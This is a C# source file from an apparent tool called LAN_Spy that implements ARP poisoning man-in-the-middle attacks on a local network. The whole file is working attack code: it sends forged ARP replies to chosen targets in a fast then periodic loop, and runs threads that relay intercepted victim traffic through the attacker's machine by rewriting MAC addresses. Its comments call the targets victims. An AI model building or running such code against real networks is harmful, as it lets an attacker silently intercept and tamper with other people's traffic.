using PacketDotNet;
using System;
using System.Collections.Generic;
using System.Net;
using System.Threading;
using PacketDotNet.Utils;
using SharpPcap;
using SharpPcap.WinPcap;

namespace LAN_Spy {
    /// <summary>
    ///     ARP毒化器。
    /// </summary>
    public class Poisoner : BasicClass {
        /// <summary>
        ///     毒化目标。
        /// </summary>
        public List<Host> Target1 = new List<Host>(), Target2 = new List<Host>();
        
        /// <summary>
        ///     默认网关。
        /// </summary>
        public Host Gateway = null;

        /// <summary>
        ///     使用设备缓存。
        /// </summary>
        private ICaptureDevice _device;

        /// <summary>
        ///     毒化目标缓存。
        /// </summary>
        private List<Host> _target1, _target2;

        /// <summary>
        ///     默认网关缓存。
        /// </summary>
        private Host _gateway;

        /// <summary>
        ///     毒化线程句柄
        /// </summary>
        private readonly List<Thread> _poisonThreads = new List<Thread>();
        
        /// <summary>
        ///     包转发线程句柄
        /// </summary>
        private readonly List<Thread> _retransmissionThreads = new List<Thread>();

        /// <summary>
        ///     根据设定的 <see cref="List{T}"/> 类型的目标列表进行ARP毒化中间人攻击。
        /// </summary>
        /// <exception cref="InvalidOperationException">已有一项毒化工作正在进行。</exception>
        /// <exception cref="NullReferenceException">未设置默认网关。</exception>
        public void StartPoisoning() {
            // 判断是否有未停止的毒化工作
            if (_poisonThreads.Count > 0)
                throw new InvalidOperationException("已有一项毒化工作正在进行。");
            
            // 深复制以缓存目标
            _target1 = new List<Host>();
            _target2 = new List<Host>();
            foreach (var target in Target1)
                _target1.Add(new Host(target.IPAddress, target.PhysicalAddress));
            foreach (var target in Target2)
                _target2.Add(new Host(target.IPAddress, target.PhysicalAddress));
            
            // 缓存网关
            _gateway = Gateway ?? throw new NullReferenceException("未设置默认网关。");

            // 缓存并打开当前设备
            if (!(_device = DeviceList[CurDevIndex]).Started) {
                _device.OnPacketArrival += Device_OnPacketArrival;
                _device.Open();
                _device.StartCapture();
            }
            
            // 创建包转发线程
            for (int i = 0; i < 8; i++) {
                Thread retransmissionThread = new Thread(RetransmissionThread);
                retransmissionThread.Start();
                _retransmissionThreads.Add(retransmissionThread);
            }

            // 开始毒化
            foreach (var target in _target1) {
                Thread poisonThread = new Thread(PoisonThread);
                poisonThread.Start(target);
                _poisonThreads.Add(poisonThread);
            }
            foreach (var target in _target2) {
                Thread poisonThread = new Thread(PoisonThread);
                poisonThread.Start(target);
                _poisonThreads.Add(poisonThread);
            }
        }

        /// <summary>
        ///     毒化线程。
        /// </summary>
        /// <param name="obj">毒化的目标。</param>
        private void PoisonThread(object obj) {
            try {
                // 获取目标
                var host = (Host) obj;
                
                // 转存目标
                var targets = _target1.Contains(host) ? _target2.AsReadOnly() : _target1.AsReadOnly();
                
                // 构建包信息
                EthernetPacket ether = new EthernetPacket(_device.MacAddress,
                    host.PhysicalAddress,
                    EthernetPacketType.Arp);
                ARPPacket arp = new ARPPacket(ARPOperation.Response,
                    host.PhysicalAddress,
                    host.IPAddress,
                    _device.MacAddress,
                    new IPAddress(new byte[] {0, 0, 0, 0})) {
                    HardwareAddressType = LinkLayers.Ethernet,
                    ProtocolAddressType = EthernetPacketType.IpV4
                };
                ether.PayloadPacket = arp;
                arp.ParentPacket = ether;
                
                // 强毒化
                for (int i = 0; i < 20; i++) {
                    foreach (var target in targets) {
                        arp.SenderProtocolAddress = target.IPAddress;
                        arp.UpdateCalculatedValues();
                        _device.SendPacket(ether);
                    }
                    Thread.Sleep(500);
                }

                // 弱毒化
                while (true) {
                    foreach (var target in targets) {
                        arp.SenderProtocolAddress = target.IPAddress;
                        arp.UpdateCalculatedValues();
                        _device.SendPacket(ether);
                    }
                    Thread.Sleep(5 * 1000);
                }
            }
            catch (ThreadAbortException) { }
        }

        /// <summary>
        ///     包转发线程。
        /// </summary>
        private void RetransmissionThread() {
            try {
                while (true) {
                    // 从队列中请求一个数据包
                    RawCapture packet;
                    if ((packet = NextRawCapture) != null) {
                        // 分析数据包中的数据
                        EthernetPacket ether = new EthernetPacket(new ByteArraySegment(packet.Data));
                        if (ether.Type != EthernetPacketType.IpV4) continue;

                        // 解析IPv4包地址
                        Host host;
                        IPv4Packet ipv4Packet = (IPv4Packet) ether.PayloadPacket;
                        if (ether.SourceHwAddress.ToString().Equals(_gateway.PhysicalAddress.ToString())) {
                            // 网关发给受害者的数据包，重定向目标地址到受害者
                            host = _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString())) ??
                                   _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString()));
                            if (host != null)
                                ether.DestinationHwAddress = host.PhysicalAddress;
                        }
                        else {
                            host = _target1.Find(item => item.PhysicalAddress.ToString().Equals(ether.SourceHwAddress.ToString())) ??
                                   _target2.Find(item => item.PhysicalAddress.ToString().Equals(ether.SourceHwAddress.ToString()));

                            // 与受害者无关的数据包，跳过
                            if (host == null) continue;

                            // 受害者发出的数据包，检查接收者
                            host = _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString())) ??
                                   _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString()));

                            if (host == null) {
                                // 受害者发给非受害者的数据包，重定向目标地址到网关
                                ether.DestinationHwAddress = _gateway.PhysicalAddress;
                            }
                            else {
                                // 受害者发给受害者的数据包，重定向目标地址到受害者，源地址到攻击者
                                ether.DestinationHwAddress = host.PhysicalAddress;
                                ether.SourceHwAddress = _device.MacAddress;
                            }
                        }
                        
                        // 转发数据包到指定目标
                        _device.SendPacket(ether);
                    } else {
                        // 队列尚未获得数据，挂起等待
                        Thread.Sleep(100);
                    }
                }
            } catch (ThreadAbortException) { }
        }

        /// <summary>
        ///     停止ARP毒化中间人攻击。
        /// </summary>
        /// <exception cref="TimeoutException">等待线程结束超时。</exception>
        public void StopPoisoning() {
            // 清理缓冲区
            ClearCaptures();

            // 向毒化线程发送终止信号
            foreach (var poisonThread in _poisonThreads)
                if (poisonThread.IsAlive)
                    poisonThread.Abort();
            
            // 等待毒化线程终止
            int waitTime = 60 * 1000;
            while (waitTime >= 0) {
                waitTime = -waitTime;
                foreach (var poisonThread in _poisonThreads)
                    if (poisonThread.IsAlive) {
                        Thread.Sleep(100);
                        if ((waitTime = -waitTime - 100) == 0)
                            throw new TimeoutException("等待线程结束超时。");
                        break;
                    }
            }
            _poisonThreads.Clear();

            // 向包转发线程发送终止信号
            foreach (var retransmissionThread in _retransmissionThreads)
                if (retransmissionThread.IsAlive)
                    retransmissionThread.Abort();
            
            // 等待包转发线程终止
            waitTime = 60 * 1000;
            while (waitTime >= 0) {
                waitTime = -waitTime;
                foreach (var retransmissionThread in _retransmissionThreads)
                    if (retransmissionThread.IsAlive) {
                        Thread.Sleep(100);
                        if ((waitTime = -waitTime - 100) == 0)
                            throw new TimeoutException("等待线程结束超时。");
                        break;
                    }
            }
            _retransmissionThreads.Clear();
            
            // 关闭设备
            if (!(_device = DeviceList[CurDevIndex]).Started) return;
            _device.OnPacketArrival -= Device_OnPacketArrival;
            _device.StopCapture();
            _device.Close();
        }
    }
}
